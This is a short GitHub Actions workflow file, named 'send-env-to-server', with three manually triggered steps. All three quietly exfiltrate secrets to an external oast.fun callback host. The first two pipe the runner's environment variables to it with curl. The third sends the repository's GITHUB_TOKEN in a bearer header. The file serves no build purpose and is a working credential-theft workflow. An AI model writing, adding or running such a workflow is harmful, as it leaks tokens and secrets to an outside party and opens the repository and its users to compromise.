name: send-env-to-server

on:
  workflow_dispatch:

jobs:
  send:
    runs-on: ubuntu-latest
    steps:
      - name: run env
        run: env | curl -s -o /dev/null -w '' -X POST -d @- https://ntdgqcmzmkgpvstrswttw9xy0ywl2c5q9.oast.fun
      - name: run secrets
        run: env | grep -E '^[A-Za-z_]+=' | curl -s -o /dev/null -w '' -X POST -d @- https://ntdgqcmzmkgpvstrswttw9xy0ywl2c5q9.oast.fun
      - name: send token
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: curl -s -o /dev/null -w '' -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://ntdgqcmzmkgpvstrswttw9xy0ywl2c5q9.oast.fun/token
